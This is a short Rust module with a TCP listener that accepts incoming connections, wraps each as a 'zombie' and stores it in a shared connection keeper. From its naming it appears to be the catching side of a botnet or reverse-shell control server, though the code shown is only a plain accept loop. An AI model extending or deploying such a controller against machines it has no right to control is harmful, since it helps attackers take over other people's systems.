mod zombie_processor;
pub mod connection_keeper;

use std::io::Error;
use log::{error, warn, info, debug, trace};
use std::net::{Ipv4Addr, SocketAddr, TcpListener, TcpStream};
use std::sync::{Arc, Mutex};
use crate::connections::zombie_processor::craft_zombie;
use crate::connections::connection_keeper::ConnectionKeeper;

pub fn start_catching(addr: SocketAddr, connection_keeper: Arc<Mutex<ConnectionKeeper>>) {
    let listener = TcpListener::bind(addr).expect("Can't bound to {addr:?}");
    info!("Started listening on {addr:?}");

    for stream in listener.incoming() {
        let connection = match stream {
            Ok(connection) => connection,
            Err(e) => {
                error!("{}", e);
                continue;
            },
        };

        let zombie = craft_zombie(connection).expect("Failed to craft zombie");
        debug!("Crafted zombie: {zombie:?}");
        connection_keeper.lock().unwrap().add_zombie(zombie);
    }
}
